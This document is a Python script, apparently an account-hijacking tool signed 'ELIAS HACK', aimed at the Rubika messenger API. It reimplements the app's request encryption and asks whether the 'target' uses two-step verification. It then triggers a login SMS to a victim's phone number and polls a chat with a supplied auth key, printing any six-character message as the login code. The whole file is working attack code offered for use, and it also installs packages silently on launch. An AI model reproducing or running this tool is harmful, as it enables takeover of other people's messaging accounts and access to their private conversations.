import os
os.system('pip install urllib3')
os.system('pip install requests')
os.system('pip install json')
os.system('pip install pycryptodome')
os.system('pip install colorama')
import base64,urllib3,time
from requests import post

from random import choice

from json import loads, dumps
from Crypto.Cipher import AES
from string import digits, ascii_lowercase
from Crypto.Util.Padding import pad,unpad
from colorama import Fore



print(Fore.LIGHTBLUE_EX+"CODED BY ELIAS HACK")
time.sleep(1)
os.system("clear")

print(Fore.GREEN+"Telegram:@THe_hackr")
time.sleep(2)
os.system("clear")



android: dict = lambda: {"eliashack" : "elias hack","app_version" : "2.9.8","platform" : "Android","package" : "ir.resaneh1.iptv","lang_code" : "en"}
random_string: str = lambda size, choices=[*ascii_lowercase, *digits]: "".join([choice(choices) for _ in range(size)])
url: str = "https://messengerg2c47.iranlms.ir/"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class encrypt:
    def __init__(self, auth):
        self.key = bytearray(self.secret(auth), "UTF-8")
        self.iv = bytearray.fromhex('00000000000000000000000000000000')

    def replaceCharAt(self, e, t, i):
        return e[0:t] + i + e[t + len(i):]

    def secret(self, e):
        t = e[0:8]
        i = e[8:16]
        n = e[16:24] + t + e[24:32] + i
        s = 0
        while s < len(n):
            e = n[s]
            if e >= '0' and e <= '9':
                t = chr((ord(e[0]) - ord('0') + 5) % 10 + ord('0'))
                n = self.replaceCharAt(n, s, t)
            else:
                t = chr((ord(e[0]) - ord('a') + 9) % 26 + ord('a'))
                n = self.replaceCharAt(n, s, t)
            s += 1
        return n

    def encrypt(self, text):
        raw = pad(text.encode('UTF-8'), AES.block_size)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        enc = aes.encrypt(raw)
        result = base64.b64encode(enc).decode('UTF-8')
        return result

    def decrypt(self, text):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        dec = aes.decrypt(base64.urlsafe_b64decode(text.encode('UTF-8')))
        result = unpad(dec, AES.block_size).decode('UTF-8')
        return result
        
def SendSMS(phone_number: str, password: str) -> dict:
	tmp = random_string(32)
	enc = encrypt(tmp)
	data = {"phone_number":f"98{phone_number[1:]}","send_type":"Internal"}
	if password != None: data["pass_key"] = password
	return loads(enc.decrypt(post(url=url, json={"api_version":"5","tmp_session": tmp,"data_enc": enc.encrypt(dumps({"method":"sendCode","input":data,"client": android()}))}).json().get("data_enc")))

def GetMsg(auth: str) -> dict:
	enc = encrypt(auth)
	data = {"api_version":"5","auth": auth,"data_enc":enc.encrypt(dumps({"method":"getMessagesInterval","input":{"object_guid":"s0B0e8da28a4fde394257f518e64e800","middle_message_id":"0"},"client": android()}))}
	while True:
		try:
			return loads(enc.decrypt(post(url=url, json=data).json().get("data_enc"))).get("data").get("messages")
			break
		except: ...
do_marhale1 = input('aya targer do marhale dard y/n: ')
none = None
if do_marhale1 == 'n':
	passw = none
elif do_marhale1 == 'y':
	e = input('enter do marhale:')
	passw = e
	
	
auth_key = input(Fore.GREEN+"enter auth:")
phone = input(Fore.CYAN+"enter phone:")

		

while True:
	try:
		print(Fore.GREEN+"""                 github: https://github.com/Elyas-Hack (: \n\n please dont edit source /:     
		chanell rubika: @github_anonymous""")
		print(SendSMS(phone_number=phone, password=passw))
		break
	except: ...

time.sleep(2)

messages = GetMsg(auth=auth_key)

for msg in messages:
	if len(msg["text"]) == 6:
		print("code ==>>> ",msg["text"])